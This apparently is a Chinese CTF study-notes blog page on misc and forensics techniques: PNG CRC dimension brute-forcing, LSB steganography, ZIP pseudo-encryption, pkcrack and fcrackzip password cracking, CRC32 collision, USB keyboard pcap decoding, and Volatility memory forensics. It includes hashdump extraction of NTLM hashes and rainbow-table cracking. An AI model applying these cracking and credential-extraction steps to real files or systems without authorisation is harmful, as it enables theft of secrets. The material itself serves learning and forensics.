binascii</span><br><span class="line">f &#x3D;open(&#39;flag.png&#39;,&#39;rb&#39;)</span><br><span class="line">s &#x3D;f.read()</span><br><span class="line">ihdr &#x3D; s[0xc:0x10]</span><br><span class="line">high &#x3D; s[0x10:0x14]</span><br><span class="line">weight &#x3D;s[0x14:0x18]</span><br><span class="line">a &#x3D; s[0x18:0x1d]</span><br><span class="line">crctarget &#x3D; s[0x1d:0x21]</span><br><span class="line">flag &#x3D; True</span><br><span class="line">#爆破高，通过比较crc来计算高</span><br><span class="line">for i in range(1,2048):</span><br><span class="line">    data &#x3D; ihdr+struct.pack(&#39;&gt;i&#39;,i)+weight+a</span><br><span class="line">    crc &#x3D; binascii.crc32(data)&amp;0xffffffff</span><br><span class="line">    crc &#x3D;hex(crc)</span><br><span class="line">    if crc[2:] &#x3D;&#x3D; crctarget.hex():</span><br><span class="line">        print(&quot;High wrong&quot;)</span><br><span class="line">        print(struct.pack(&#39;&gt;i&#39;,i).hex())</span><br><span class="line">        flag &#x3D; False</span><br><span class="line">        break</span><br><span class="line">#爆破宽度，通过比较crc来计算宽</span><br><span class="line">if flag :</span><br><span class="line">    for i in range(1, 2048):</span><br><span class="line">        data &#x3D; ihdr + high+ struct.pack(&#39;&gt;i&#39;, i)  + a</span><br><span class="line">        crc &#x3D; binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">        crc &#x3D; hex(crc)</span><br><span class="line">        if crc[2:] &#x3D;&#x3D; crctarget.hex():</span><br><span class="line">            print(&#39;Weight Wrong&#39;)</span><br><span class="line">            print(struct.pack(&#39;&gt;i&#39;, i).hex())</span><br><span class="line">            break</span><br><span class="line"># High wrong 000001d6</span><br></pre></td></tr></table></figure>

<h2 id="文本编码："><a href="#文本编码：" class="headerlink" title="文本编码："></a>文本编码：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#encoding</span><br><span class="line">steg&#x3D; LSBSteg(cv2.imread(&quot;my_image.png&quot;))</span><br><span class="line">img_encoded&#x3D; steg.encode_text(&quot;my message&quot;)</span><br><span class="line">cv2.imwrite(&quot;my_new_image.png&quot;,img_encoded)</span><br><span class="line"> </span><br><span class="line">#decoding</span><br><span class="line">im &#x3D;cv2.imread(&quot;my_new_image.png&quot;)</span><br><span class="line">steg&#x3D; LSBSteg(im)</span><br><span class="line">print(&quot;Textvalue:&quot;,steg.decode_text())</span><br></pre></td></tr></table></figure>



<h2 id="图像隐写："><a href="#图像隐写：" class="headerlink" title="图像隐写："></a>图像隐写：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#encoding</span><br><span class="line">steg&#x3D; LSBSteg(cv2.imread(&quot;carrier.png&quot;)</span><br><span class="line">new_im&#x3D; steg.encode_image(cv2.imread(&quot;secret_image.jpg&quot;))</span><br><span class="line">cv2.imwrite(&quot;new_image.png&quot;,new_im)</span><br><span class="line"> </span><br><span class="line">#decoding</span><br><span class="line">steg&#x3D; LSBSteg(&quot;new_image.png&quot;)</span><br><span class="line">orig_im&#x3D; steg.decode_image()</span><br><span class="line">cv.SaveImage(&quot;recovered.png&quot;,orig_im)</span><br></pre></td></tr></table></figure>



<h2 id="代码隐写："><a href="#代码隐写：" class="headerlink" title="代码隐写："></a>代码隐写：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#encoding</span><br><span class="line">steg&#x3D; LSBSteg(cv2.imread(&quot;carrier.png&quot;))</span><br><span class="line">data&#x3D; open(&quot;my_data.bin&quot;, &quot;rb&quot;).read()</span><br><span class="line">new_img&#x3D; steg.encode_binary(data)</span><br><span class="line">cv2.imwrite(&quot;new_image.png&quot;,new_img)</span><br><span class="line"> </span><br><span class="line">#decoding</span><br><span class="line">steg&#x3D; LSBSteg(cv2.imread(&quot;new_image.png&quot;))</span><br><span class="line">binary&#x3D; steg.decode_binary()</span><br><span class="line">withopen(&quot;recovered.bin&quot;, &quot;rb&quot;) as f:</span><br><span class="line">f.write(data)</span><br></pre></td></tr></table></figure>

<p>​    【】Image Steganography</p>
<h2 id="BMP"><a href="#BMP" class="headerlink" title="BMP"></a>BMP</h2><p>Windows Bitmap (bmp)，文件头：424D E3BF22 000000<br>424D D65609 000000<br>424D469000000000000046000000280000008000000090000000010010000300000000900000A00F0000A00F00000000000000000000</p>
<p>424D360C3000000000003600000028000000560500000003000001001800000000000000000000000000000000000000000000000000<br>    outguess<br>    【LSB隐写】wbStego</p>
<h2 id="ZIP-Archive-zip"><a href="#ZIP-Archive-zip" class="headerlink" title="ZIP Archive (zip)"></a>ZIP Archive (zip)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">解压缩操作经常会给出zip文件无法解压的相关有用信息</span><br><span class="line">Zipdetails -v能够根据参数提供多种信息</span><br><span class="line">Zipinfo在无需提取的情况下列出了zip文件的内容信息</span><br><span class="line">zip -F      input.zip --out output.zip和zip -FF      input.zip --out output.zip 尝试修复损坏的zip文件</span><br></pre></td></tr></table></figure>

<h3 id="1-zip伪加密-binwalk-foremost直接可以把伪加密中的文件解压出来"><a href="#1-zip伪加密-binwalk-foremost直接可以把伪加密中的文件解压出来" class="headerlink" title="1.zip伪加密//binwalk   foremost直接可以把伪加密中的文件解压出来"></a>1.zip伪加密//binwalk   foremost直接可以把伪加密中的文件解压出来</h3><p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723090021594.png" alt="image-20200723090021594"></p>
<h3 id="2-暴力破解-Ziperello和ARCHPR都可以"><a href="#2-暴力破解-Ziperello和ARCHPR都可以" class="headerlink" title="2.暴力破解 Ziperello和ARCHPR都可以"></a>2.暴力破解 Ziperello和ARCHPR都可以</h3><h3 id="3-明文攻击"><a href="#3-明文攻击" class="headerlink" title="3.明文攻击"></a>3.明文攻击</h3><p>./pkcrack -c “readme.txt” -p readme.txt  -C Desktop.zip   -P readme.zip -d decrypt.zip</p>
<p>./pkcrack -c “logo.png” -p logo.png -C flag.zip   -P logo.zip -d decrypt.zip</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">./pkcrack -c <span class="string">"answer/key.txt"</span> -p readme.txt -C Desktop.zip -P readme.zip</span><br><span class="line">-C:要破解的目标文件(含路径)</span><br><span class="line"></span><br><span class="line">-c:破解文件中的明文文件的名字(其路径不包括系统路径,从zip文件一层开始)</span><br><span class="line"></span><br><span class="line">-P:压缩后的明文文件</span><br><span class="line"></span><br><span class="line">-p:压缩的明文文件中明文文件的名字(也就是readme.txt在readme.zip中的位置)</span><br><span class="line">至于其他选项参看./pkcrack --<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">pkcrack还有一个重要的选项是-d，后面跟一个文件名，比如decrypt.zip，表示解密后的zip文件输出。据说这个命令可以加快解密时间，我尝试过以后发现并没有快多少，所以我花了两个小时还没跑出来密码QAQ</span><br></pre></td></tr></table></figure>

<h3 id="4-crc32碰撞"><a href="#4-crc32碰撞" class="headerlink" title="4.crc32碰撞"></a>4.crc32碰撞</h3><p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723140209998.png" alt="image-20200723140209998"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf=8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">real = <span class="number">0x56EA988D</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">9999</span>):</span><br><span class="line">    <span class="keyword">if</span> real == (binascii.crc32(str(y)) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">        print(y)</span><br><span class="line">print(<span class="string">'End'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python crc32.py reverse 你的crc32密文</span><br></pre></td></tr></table></figure>

<blockquote>
<p>文件头：数据区未加密504B0304140000000800</p>
<p>?               数据区真加密504B0304 1400【09】00 0800</p>
<p>?               目录区伪加密504B0102 1F001400 0900</p>
<p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723141418174.png" alt="image-20200723141418174"></p>
<p><strong>a.压缩源文件数据区：</strong></p>
<p>50 4B <strong>03 04</strong>：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br><strong>00 00</strong>：全局方式位标记（有无加密）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度<br>6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500</p>
<p><strong>b.压缩源文件目录区:</strong></p>
<p>50 4B <strong>01 02</strong>：目录中文件文件头标记(0x02014b50)<br><strong>3F 00</strong>：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br><strong>00 00</strong>：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量<br>6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001</p>
<p><strong>c.压缩源文件目录结束标志:</strong></p>
<p>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00 1A：ZIP 文件注释长度</p>
</blockquote>
<p>?    zip爆破：kali:fcrackzip<br>?    使用fcrackzip -b -u -l 1-5 filename.zip爆破出压缩密码<br>?    不知密码长度情况下：<br>?    fcrackzip -b -c1 -u -l 1-4 test.zip<br>?    (－b 指定模式为爆破，-c1指定密码类型为纯数字，其它类型可以rtfm,-u这个参数非常重要不然不显示破解出来的密码,-l 5-6可以指定长度)</p>
<p>字典</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u crack_this.zip</span><br></pre></td></tr></table></figure>

<p>?    <a href="https://blog.csdn.net/u011500307/article/details/17371651" target="_blank" rel="noopener">https://blog.csdn.net/u011500307/article/details/17371651</a></p>
<p>TIFF (tif)，文件头：49492A00<br>RAR Archive (rar)，文件头：52617221 1A0700CF907300000D00000000000000</p>
<h2 id="rar伪加密"><a href="#rar伪加密" class="headerlink" title="rar伪加密"></a>rar伪加密</h2><p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723141856821.png" alt="image-20200723141856821"></p>
<p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723142257924.png" alt="image-20200723142257924"></p>
<p>Adobe Acrobat (pdf)，文件头：255044462D312E</p>
<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723190953321.png" alt="image-20200723190953321"></p>
<p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723191436067.png" alt="image-20200723191436067"></p>
<p>http.request.method == GET</p>
<p>  一般用Post方法传递参数</p>
<p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723191750471.png" alt="image-20200723191750471"></p>
<p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723191758273.png" alt="image-20200723191758273"></p>
<p>追踪tcp流  http流     </p>
<p>ctrl+f查找 </p>
<p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723192809773.png" alt="image-20200723192809773"></p>
<h3 id="蓝牙协议"><a href="#蓝牙协议" class="headerlink" title="蓝牙协议"></a>蓝牙协议</h3><p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723195513288.png" alt="image-20200723195513288"></p>
<h3 id="wifi"><a href="#wifi" class="headerlink" title="wifi"></a>wifi</h3><p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723201554571.png" alt="image-20200723201554571"></p>
<p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723201707897.png" alt="image-20200723201707897"></p>
<h3 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h3><p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723203848139.png" alt="image-20200723203848139"></p>
<h3 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h3><p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723203930514.png" alt="image-20200723203930514"></p>
<p>tshark -r key.pcap -T fields -e usb.capdata &gt; usbdata.txt</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#键盘流量</span></span><br><span class="line">normalKeys = &#123;<span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>, <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>, <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>, <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>, <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>, <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>, <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,<span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"'"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,<span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>, <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>, <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>, <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span class="string">"17"</span>:<span class="string">"T"</span>, <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>, <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>, <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&amp;"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"&#123;"</span>,<span class="string">"30"</span>:<span class="string">"&#125;"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,<span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">"&lt;"</span>,<span class="string">"37"</span>:<span class="string">"&gt;"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">'0'</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">'2'</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">"00"</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">'2'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">'[unknown]'</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line">print(<span class="string">""</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">'&lt;DEL&gt;'</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">"&lt;CAP&gt;"</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'output :'</span> + <span class="string">""</span>.join(output))</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723210633273.png" alt="image-20200723210633273"></p>
<p>直接对pcap文件进行binwalk和foremost</p>
<h2 id="raw"><a href="#raw" class="headerlink" title="raw"></a>raw</h2><p> raw文件是内存取证工具<a href="https://www.aldeid.com/wiki/Dumpit" target="_blank" rel="noopener">Dumpit</a>提取内存生成的内存转储文件，可以使用类似Volatility等内存取证分析工具进行取证分析。 </p>
<p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200723220310464.png" alt="image-20200723220310464"></p>
<h3 id="volatility"><a href="#volatility" class="headerlink" title="volatility"></a><strong>volatility</strong></h3><p>框架是一款用于易失性内存取证的重量级框架。在该框架下我们可以完成许多取证的操作，获取我们想取得的信息。其支持的操作系统也非常广泛，同时支持  windows , linux, Mac OSX,甚至也支持 Android  手机使用ARM处理器的取证。因此，它也是所有网络取证爱好者的必学框架。 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">volatility 使用：</span><br><span class="line">        volatility -f &lt;文件名&gt; -–profile=&lt;配置文件&gt; &lt;插件&gt; [插件参数] </span><br><span class="line">通过volatility --info获取工具所支持的profile，Address Spaces，Scanner Checks，Plugins</span><br><span class="line"></span><br><span class="line">常用插件：</span><br><span class="line">imageinfo：显示目标镜像的摘要信息，知道镜像的操作系统后，就可以在 –profile 中带上对应的操作系统</span><br><span class="line">pslist：该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以</span><br><span class="line">psscan：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程</span><br><span class="line">pstree：以树的形式查看进程列表，和pslist一样，也无法检测隐藏或解链的进程</span><br><span class="line">mendump：提取出指定进程，常用foremost 来分离里面的文件</span><br><span class="line">filescan：扫描所有的文件列表</span><br><span class="line">hashdump：查看当前操作系统中的 password hash，例如 Windows 的 SAM 文件内容</span><br><span class="line">svcscan：扫描 Windows 的服务</span><br><span class="line">connscan：查看网络连接</span><br></pre></td></tr></table></figure>





<p>2.熟悉Volatility的使用以及插件功能，发现hashdump可以将内存中的NTML提取出来： </p>
<p>volatility  hashdump  imageinfo -f 1.raw  –profile=WinXPSP2x86</p>
<p> 基于彩虹表在线NTML hash破解器<a href="http://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="noopener">Ophcrack</a>，原理通过使用预先完成的计算结果及存储的彩虹表来加速破解hash。 </p>
<p>3.小黑在发送文件，那么一定向外建立了连接，于是便使用connscan插件（tcp连接池扫描插件）。 </p>
<p>volatility  connscan  imageinfo -f 1.raw  –profile=WinXPSP2x86</p>
<p> 可以看到本机192.168.57.21的1045与远程主机192.168.57.14的2333端口建立了连接，并且进程号为120，于是使用psscan插件（进程池扫描插件）获取跟多信息 </p>
<p><code>volatility  psscan imageinfo -f 1.raw  –profile=WinXPSP2x86</code></p>
